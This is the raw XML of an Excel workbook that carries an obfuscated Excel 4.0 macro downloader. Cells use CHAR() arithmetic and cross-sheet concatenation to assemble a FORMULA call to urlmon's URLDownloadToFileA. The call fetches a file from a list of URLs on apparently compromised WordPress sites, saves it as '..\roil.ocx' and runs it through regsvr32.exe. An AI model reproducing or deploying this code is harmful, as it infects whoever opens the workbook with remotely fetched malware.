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CIR\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{A916476E-B8D4-4886-BC7E-6F6D86DEB2A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4" l="1"/>
  <c r="R18" i="4"/>
  <c r="I2" i="3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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="20" uniqueCount="20">
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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",0,0)</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>regsvr32.exe</t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>landingpageis.com/alfacgiapi/IhZmV1LIJwi6O/","</t>
  </si>
  <si>
    <t>londoninsurancelife-lmg.com/wp-content/HukqubgSP/","</t>
  </si>
  <si>
    <t>franciscosobrado.com/wp-content/xp/","</t>
  </si>
  <si>
    <t>britainsolicitors.com/wp-admin/disNolZkYooJTascNDEk/","</t>
  </si>
  <si>
    <t>w"&amp;"ww.curtisse.com/wordpress/kXUx9P38X/","</t>
  </si>
  <si>
    <t>bsprabodhini.org/wp-content/i1e8aSEloGChNad3m/","</t>
  </si>
  <si>
    <t>toyota-4wd.com/wp-content/55d3MMJGg6CMSFhS/","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</si>
</sst>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quotePrefix="1"/>
    <xf numFmtId="0" fontId="2" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="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topLeftCell="E4" workbookViewId="0">
      <selection activeCell="E12" sqref="E12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.7109375" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="4" width="8.7109375" style="4"/>
    <col min="5" max="5" width="255.7109375" style="4" bestFit="1" customWidth="1"/>
    <col min="6" max="16384" width="8.7109375" style="4"/>
  </cols>
  <sheetData>
    <row r="11" spans="5:5" x14ac:dyDescent="0.25">
      <c r="E11" s="4" t="b">
        <f>FORMULA(Ykllt!P22&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!F21&amp;Thjk!R18&amp;GV!I10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GV!I10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GV!I10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GV!I10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GV!I10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GV!I10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GV!I10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GV!I10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I12"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="I10" sqref="I10"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="4"/>
  </cols>
  <sheetData>
    <row r="6" spans="3:9" x14ac:dyDescent="0.25">
      <c r="F6" s="4" t="str">
        <f>CONCATENATE(Ykllt!P20&amp;Ykllt!P27&amp;Ykllt!P27)</f>
        <v>://</v>
      </c>
    </row>
    <row r="10" spans="3:9" x14ac:dyDescent="0.25">
      <c r="I10" s="4" t="str">
        <f>T(Ykllt!P5&amp;Ykllt!E2&amp;Ykllt!L11&amp;Ykllt!G14)</f>
        <v>.ocx</v>
      </c>
    </row>
    <row r="12" spans="3:9" x14ac:dyDescent="0.25">
      <c r="C12" s="4" t="str">
        <f>CONCATENATE(Ykllt!P15&amp;Ykllt!F19&amp;Ykllt!L19&amp;Ykllt!L19&amp;Ykllt!N17&amp;Ykllt!M7)</f>
        <v>"https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66" sqref="AM66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>
      <selection activeCell="D7" sqref="D7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="4"/>
  </cols>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" s="4" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" s="4" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" s="4" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" s="4" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" s="4" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" s="4" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" s="4" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" s="4" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" s="4" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4" s="4">
        <v>1</v>
      </c>
      <c r="N4" s="4" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" s="4" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" s="4" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" s="4" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" s="4" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" s="4" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7" s="4">
        <v>3</v>
      </c>
      <c r="M7" s="4" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" s="4" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" s="4" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" s="4" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" s="4" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" s="4" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" s="4" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" s="4" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" s="4" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" s="4" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" s="4" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" s="4" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" s="4" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" s="4" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13" s="4">
        <v>2</v>
      </c>
      <c r="P13" s="4" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" s="4" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" s="4" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" s="4" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" s="4" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" s="4" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" s="4" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" s="4" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" s="4" t="s">
        <v>1</v>
      </c>
      <c r="N17" s="4" t="s">
        <v>9</v>
      </c>
      <c r="P17" s="4" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" s="4" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="F19" s="4" t="s">
        <v>7</v>
      </c>
      <c r="L19" s="4" t="s">
        <v>8</v>
      </c>
      <c r="P19" s="4" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20" s="4">
        <v>8</v>
      </c>
      <c r="P20" s="4" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" s="4" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" s="4" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" s="4" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" s="4" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" s="4" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" s="4" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32" s="4">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33" s="4">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35" s="4">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36" s="4">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37" s="4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topLeftCell="A8" workbookViewId="0">
      <selection activeCell="D17" sqref="D17"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="4:15" x14ac:dyDescent="0.25">
      <c r="I2" t="str">
        <f>T(Ykllt!D7&amp;Ykllt!C9&amp;Ykllt!E2&amp;Ykllt!D17&amp;Ykllt!F15&amp;Ykllt!E6&amp;Ykllt!E2&amp;Ykllt!B18&amp;Ykllt!G2&amp;Ykllt!C9)</f>
        <v>nloadToFil</v>
      </c>
    </row>
    <row r="6" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D6" t="str">
        <f>T(Ykllt!P11&amp;Ykllt!P15&amp;Ykllt!B5&amp;Ykllt!C3&amp;Ykllt!C9&amp;Ykllt!A12)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="9" spans="4:15" x14ac:dyDescent="0.25">
      <c r="L9" t="str">
        <f>T(Ykllt!P15&amp;Ykllt!P7&amp;Ykllt!P15&amp;Ykllt!J6&amp;Ykllt!J6&amp;Ykllt!H9&amp;Ykllt!H9&amp;Ykllt!K14&amp;Ykllt!K14&amp;Ykllt!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="11" spans="4:15" x14ac:dyDescent="0.25">
      <c r="F11" t="str">
        <f>T(Ykllt!D7&amp;Ykllt!P15&amp;Ykllt!P7&amp;Ykllt!P15&amp;Ykllt!E11&amp;Ykllt!F4&amp;Ykllt!B15&amp;Ykllt!D13&amp;Ykllt!E2)</f>
        <v>n","URLDo</v>
      </c>
    </row>
    <row r="16" spans="4:15" x14ac:dyDescent="0.25">
      <c r="O16" t="str">
        <f>T(Ykllt!P2&amp;Ykllt!M7)</f>
        <v>-s</v>
      </c>
    </row>
    <row r="19" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F19" s="1"/>
      <c r="G19" s="1"/>
    </row>
    <row r="20" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F20" s="1"/>
      <c r="G20" s="2"/>
    </row>
    <row r="21" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F21" t="s">
        <v>13</v>
      </c>
      <c r="H21" t="s">
        <v>15</v>
      </c>
      <c r="J21" t="s">
        <v>17</v>
      </c>
      <c r="L21" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="23" spans="6:12" x14ac:dyDescent="0.25">
      <c r="G23" t="s">
        <v>14</v>
      </c>
      <c r="I23" t="s">
        <v>16</v>
      </c>
      <c r="K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topLeftCell="A4" workbookViewId="0">
      <selection activeCell="F14" sqref="F14"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="4"/>
  </cols>
  <sheetData>
    <row r="4" spans="6:18" x14ac:dyDescent="0.25">
      <c r="R4" s="5"/>
    </row>
    <row r="7" spans="6:18" x14ac:dyDescent="0.25">
      <c r="H7" s="4" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="8" spans="6:18" x14ac:dyDescent="0.25">
      <c r="P8" s="4" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="11" spans="6:18" x14ac:dyDescent="0.25">
      <c r="M11" s="4" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="13" spans="6:18" x14ac:dyDescent="0.25">
      <c r="F13" s="4" t="str">
        <f>CONCATENATE(Ykllt!P19,Ykllt!P5,Ykllt!P5,Ykllt!P3,Ykllt!C3,Ykllt!E2,Ykllt!G2,Ykllt!C9)</f>
        <v xml:space="preserve"> ..\roil</v>
      </c>
    </row>
    <row r="15" spans="6:18" x14ac:dyDescent="0.25">
      <c r="L15" s="4" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="18" spans="5:18" x14ac:dyDescent="0.25">
      <c r="R18" s="4" t="str">
        <f>CONCATENATE(Ykllt!P5,Ykllt!P5,Ykllt!P3,Ykllt!C3,Ykllt!E2,Ykllt!G2,Ykllt!C9)</f>
        <v>..\roil</v>
      </c>
    </row>
    <row r="19" spans="5:18" x14ac:dyDescent="0.25">
      <c r="E19" s="4" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="20" spans="5:18" x14ac:dyDescent="0.25">
      <c r="I20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2022-03-18T18:17:02Z</dcterms:modified>
</cp:coreProperties>
</file>